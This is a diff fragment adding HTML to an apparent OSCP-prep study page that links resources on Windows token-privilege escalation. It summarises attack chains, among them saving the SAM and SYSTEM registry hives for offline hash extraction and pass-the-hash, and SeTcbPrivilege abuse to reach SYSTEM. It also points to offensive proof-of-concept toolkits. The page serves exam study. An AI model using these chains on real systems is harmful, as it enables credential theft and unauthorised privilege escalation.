+            <div style="color:var(--gold);font-weight:700;margin-bottom:4px">Saqib Chand — SeBackupPrivilege in the wild on PG</div>
+            <div style="font-size:12px;color:var(--text2);margin-bottom:6px">Chain: reg save HKLM\sam + HKLM\system → secretsdump offline → admin hash → PtH</div>
+            <a href="https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491" target="_blank" style="color:var(--teal);font-size:12px">medium.com/@sakyb7/...hokkaido &#8599;</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">📄 Deep Technical Papers</div>
+        <div class="section-body">
+          <div style="display:grid;gap:8px">
+            <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
+              <div style="color:var(--gold);font-weight:700;margin-bottom:4px">SeTcbPrivilege — ExploitDB Paper #42556 (must read)</div>
+              <div style="font-size:12px;color:var(--text2);margin-bottom:6px">"Abusing Token Privileges For LPE" — the definitive resource. LsaLogonUser S4U → add S-1-5-18 (SYSTEM SID) to token → impersonate → SYSTEM without SeImpersonate.</div>
+              <a href="https://www.exploit-db.com/papers/42556" target="_blank" style="color:var(--teal);font-size:12px">exploit-db.com/papers/42556 &#8599;</a>
+            </div>
+            <div style="background:var(--bg3);border-radius:4px;padding:10px 14px">
+              <div style="color:var(--gold);font-weight:700;margin-bottom:4px">Hacer Dalkiran — Critical Windows Privs + EnableAllTokenPrivs</div>
+              <div style="font-size:12px;color:var(--text2);margin-bottom:6px">Covers SeTakeOwnership, SeBackup, SeCreateToken with EnableAllTokenPrivs.ps1 to enable disabled privileges. Key lesson: check disabled privs too.</div>
+              <a href="https://hacerdalkiran.medium.com/critical-windows-user-privileges-for-windows-privesc-55ef12824f90" target="_blank" style="color:var(--teal);font-size:12px">hacerdalkiran.medium.com/critical-windows-user-privileges &#8599;</a>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="section-header">🔧 Master Reference Resources</div>
+        <div class="section-body">
+          <div style="display:grid;gap:6px;font-size:12px">
+            <div><a href="https://github.com/gtworek/Priv2Admin" target="_blank" style="color:var(--teal)">Priv2Admin &#8599;</a> — ALL Windows privileges mapped to attack paths (canonical reference)</div>
+            <div><a href="https://github.com/daem0nc0re/PrivFu" target="_blank" style="color:var(--teal)">PrivFu &#8599;</a> — full privilege manipulation toolkit (SeTcb, SeCreateToken, SeManageVolume PoCs)</div>
+            <div><a href="https://github.com/hatRiot/token-priv" target="_blank" style="color:var(--teal)">token-priv &#8599;</a> — SeTcb, SeCreateToken, SeTakeOwnership PoC suite (hatRiot)</div>
+            <div><a href="https://github.com/fashionproof/EnableAllTokenPrivs" target="_blank" style="color:var(--teal)">EnableAllTokenPrivs.ps1 &#8599;</a> — enable all disabled token privileges in one shot</div>
+            <div><a href="https://oscp.adot8.com/windows-privilege-escalation/whoami-priv" target="_blank" style="color:var(--teal)">adot8 OSCP notes — whoami /priv &#8599;</a> — SeManageVolume, SeBackup, SeRestore pages</div>
+            <div><a href="https://0xdf.gitlab.io/cheatsheets/offsec" target="_blank" style="color:var(--teal)">0xdf OffSec exam prep machine list &#8599;</a></div>
           </div>
         </div>
       </div>
